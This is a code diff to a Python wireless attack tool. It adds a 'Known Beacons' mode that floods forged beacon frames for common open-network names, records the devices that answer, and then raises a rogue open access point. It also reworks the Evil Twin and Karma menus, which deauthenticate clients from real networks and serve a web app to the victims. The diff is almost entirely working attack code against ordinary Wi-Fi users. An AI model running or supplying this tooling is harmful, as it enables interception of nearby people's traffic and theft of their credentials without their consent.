@@ -17,11 +17,15 @@ def title():
     return ret
 
 class networkInterfaces:
+
     # Here we find directories representing current network interfaces named after them
     netIntDir = '/sys/class/net'
     
     hostapdLogFile = 'hostapd.log'
     dnsmasqLogFile = 'dnsmasq.log'
+
+    knownOpenWifis = 'known-open-wlans.txt'
+    probedFile = 'probedSSIDs.txt'
 
     def __init__(self):
         self.interfaces = []
@@ -197,7 +201,7 @@ class networkInterfaces:
                 return accessPoints[accessPoint]
         print('\n')
 
-    def sniffUsedAccessPoints(self, nInterface, sigint_handler):
+    def sniffClientsInAccessPoints(self, nInterface, sigint_handler):
         accessPointsWOClients = {}
         accessPoints = []
 
@@ -329,6 +333,83 @@ class networkInterfaces:
             else:
                 return probeRequests[probeRequest]
 
+    def sniffKnownOpenWifis(self, nInterface, sigint_handler):
+        numBeacons = 10000
+
+        if type(nInterface) is not int:
+            print('[x] Input value is not an integer!\n')
+            return -1
+
+        if nInterface < 0 or nInterface >= len(self.interfaces):
+            print('[x] Input value out of bounds!\n')
+            return -1
+
+        global stop
+        stop = False
+
+        def sigint_handler_probe(sig, frame):
+            print('\n[+] SIGINT: killing sender...')
+            global stop
+            stop = True
+            signal.signal(signal.SIGINT, sigint_handler)
+        
+        signal.signal(signal.SIGINT, sigint_handler_probe)
+
+        interface = self.interfaces[nInterface]['name']
+        bssid = '16:91:82:18:79:B2' # Fake bssid (random)
+        beaconSSID = previousSSID = ''
+        probedFD = open(self.probedFile, 'a')
+        probed = []
+
+        # Sniff probe requests
+        def sniffAP_callback(pkt):
+            # Protocol 802.11, type management, subtype probe request
+            if pkt.haslayer(Dot11) and pkt[Dot11].type == 0 and pkt[Dot11].subtype == 4 and not stop:
+                ssid = pkt.info.decode('UTF-8')
+                
+                if ssid and (ssid == beaconSSID or ssid == previousSSID):
+                    client = pkt[Dot11].addr2.upper()
+                    print('[+] Client ' + client + ' responded to ' + ssid)
+                    if ssid not in probed:
+                        probedFD.write(ssid + ' (' + client + ')\n')
+                        probed.append(ssid)
+
+        sniffer = AsyncSniffer(iface=self.interfaces[nInterface]['name'], prn=sniffAP_callback)
+        sniffer.start()
+        
+        # Send beacon frames
+        f = open(os.path.join(self.knownOpenWifis))
+        while f and not stop:
+            beaconSSID = f.readline().split('\n')[0]
+
+            print('[-] Sending ' + str(numBeacons) + ' beacon frames with ssid ' + beaconSSID)
+
+            # Type management, subtype beacon
+            beaconFrame = RadioTap()/Dot11(type=0, subtype=8, addr1='FF:FF:FF:FF:FF:FF', addr2=bssid, addr3=bssid)/Dot11Beacon()/Dot11Elt(ID='SSID', info=beaconSSID, len=len(beaconSSID))
+
+            sendp(beaconFrame, iface=interface, count = numBeacons, verbose = 0)
+            previousSSID = beaconSSID
+
+        f.close()
+        probedFD.close()
+        sniffer.stop()
+
+        print('\nPROBED SSIDs')
+        i=1
+        for ssid in probed:
+            print('[' + str(i) + '] -> ' + ssid)
+            i = i + 1
+
+        ssid = -1
+        while ssid < 0 or ssid >= len(probed):
+            ssid = int(input('\nSelect probed SSID > ')) - 1
+
+            if ssid < 0 or ssid >= len(probed):
+                print('[x] Input out of bounds!')
+            else:
+                print()
+                return probed[ssid]
+
     def launchHostapd(self, nInterface, ssid, channel, encryption):
     
         if type(nInterface) is not int:
@@ -441,7 +522,7 @@ class networkInterfaces:
 
         return 0
 
-    def deauth(self, nInterface, sigint_handler, channel, bssid):
+    def deauth(self, nInterface, channel, bssid):
         if type(nInterface) is not int:
             print('[x] Input value is not an integer!\n')
             return -1
@@ -578,15 +659,15 @@ os.system('iptables -F')
 os.system('iptables -t nat -F')
 print('[+] Iptables flushed')
 
-# Select operation mode
+# Select operating mode
 op = -1
 while op < 1 or op > 4:
-    print('\nOPERATION MODE')
-    print('[1] -> Create new acces point')
-    print('[2] -> [Evil Twin] Intercept existing access point')
-    print('[3] -> [Evil Twin] Intercept clients connected to access point')
-    print('[4] -> [Karma] Create acces point recogniced by victim')
-    op = int(input('Select operation mode > '))
+    print('\nOPERATING MODE')
+    print('[1] -> Rogue AP')
+    print('[2] -> Evil Twin')
+    print('[3] -> Karma')
+    print('[4] -> Known Beacons')
+    op = int(input(' > '))
     print()
 
     if op == 1:
@@ -602,9 +683,9 @@ while op < 1 or op > 4:
             if encr < 1 or encr > 2:
                 print('[x] Input value out of bounds!\n')
             elif encr == 1:
-                encryption = "OPN"
+                encryption = 'OPN'
             elif encr == 2:
-                encryption = "WPA2/PSK"
+                encryption = 'WPA2/PSK'
         print()
 
         # Launch hostapd
@@ -651,10 +732,20 @@ while op < 1 or op > 4:
                     else:
                         ok = 0
 
-        print('[+] Second network Interface in use: ' + networkInterfaces.interfaces[interface2]['name'] + ' (' + networkInterfaces.getMode(interface2) + ')\n')
+        print('[+] Second network Interface: ' + networkInterfaces.interfaces[interface2]['name'] + '\n')
         
-        accessPoint = networkInterfaces.sniffAccessPoints(interface, sigint_handler)
-        
+        clients = ''
+        while clients != 'Y' and clients != 'N':
+            clients = input('Show only APs with clients connected? [Y/N] > ').upper()
+            if clients == 'Y':
+                print()
+                accessPoint = networkInterfaces.sniffClientsInAccessPoints(interface, sigint_handler)
+            elif clients == 'N':
+                print()
+                accessPoint = networkInterfaces.sniffAccessPoints(interface, sigint_handler)
+            else:
+                print('[x] Select a valid option!')
+
         bssid = accessPoint['bssid']
         ssid = accessPoint['ssid']
         channel = accessPoint['channel']
@@ -671,66 +762,9 @@ while op < 1 or op > 4:
         configWebApp()
 
         # Deauth AP
-        networkInterfaces.deauth(interface2, sigint_handler, channel, bssid)
+        networkInterfaces.deauth(interface2, channel, bssid)
 
     elif op == 3:
-        # Select network interface 2
-        if len(networkInterfaces.interfaces) == 1:
-            print('[x] Not enough network interface detected (2)!\n')
-            quit()
-
-        elif len(networkInterfaces.interfaces) == 2:
-            if interface == 0:
-                interface2 = 1
-            else:
-                interface2 = 0
-            
-            if networkInterfaces.interfaces[interface2]['mode'] != 'monitor':
-                if networkInterfaces.putInMonitor(interface2) != 0:
-                    print('[x] Second network interface couldn\'t be put in monitor mode')
-                    quit()
-
-
-        elif len(networkInterfaces.interfaces) > 2:
-            ok = -1
-            while ok != 0: 
-                print(networkInterfaces)
-                interface2 = int(input('Select network interface > ')) - 1
-                print()
-                if interface2 < 0 or interface2 >= len(networkInterfaces.interfaces): 
-                    print('[x] Input value out of bounds!')
-                elif interface2 == interface:
-                    print('[x] ' + networkInterfaces.interfaces[interface]['name'] + ' already in use!')
-                else:
-                    if networkInterfaces.interfaces[interface2]['mode'] != 'monitor':
-                        ok = networkInterfaces.putInMonitor(interface2)
-                    else:
-                        ok = 0
-
-        print('[+] Second network Interface in use: ' + networkInterfaces.interfaces[interface2]['name'] + ' (' + networkInterfaces.getMode(interface2) + ')\n')
-
-        accessPoint = networkInterfaces.sniffUsedAccessPoints(interface, sigint_handler)
-        
-        bssid = accessPoint['bssid']
-        ssid = accessPoint['ssid']
-        client = accessPoint['client']
-        channel = accessPoint['channel']
-        encryption = accessPoint['encryption']
-
-        # Launch hostapd
-        networkInterfaces.launchHostapd(interface, ssid, channel, encryption)
-
-        # Launch dnsmasq
-        if networkInterfaces.launchDnsmasq(interface) != 0:
-            quit()
-
-        # Config web app
-        configWebApp()
-
-        # Deauth AP
-        networkInterfaces.deauth(interface2, sigint_handler, channel, bssid)
-
-    elif op == 4:
         probeRequest = networkInterfaces.sniffProbeReq(interface, sigint_handler)
         ssid = probeRequest['ssid']
         channel = input('Channel > ')
@@ -744,10 +778,25 @@ while op < 1 or op > 4:
             if encr < 1 or encr > 2:
                 print('[x] Input value out of bounds!\n')
             elif encr == 1:
-                encryption = "OPN"
+                encryption = 'OPN'
             elif encr == 2:
-                encryption = "WPA2/PSK"
+                encryption = 'WPA2/PSK'
         print()
+
+        # Launch hostapd
+        networkInterfaces.launchHostapd(interface, ssid, channel, encryption)
+
+        # Launch dnsmasq
+        if networkInterfaces.launchDnsmasq(interface) != 0:
+            quit()
+
+        # Config web app
+        configWebApp()
+
+    elif op == 4:
+        ssid = networkInterfaces.sniffKnownOpenWifis(interface, sigint_handler)
+        channel = input('Channel > ')
+        encryption = 'OPN'
 
         # Launch hostapd
         networkInterfaces.launchHostapd(interface, ssid, channel, encryption)
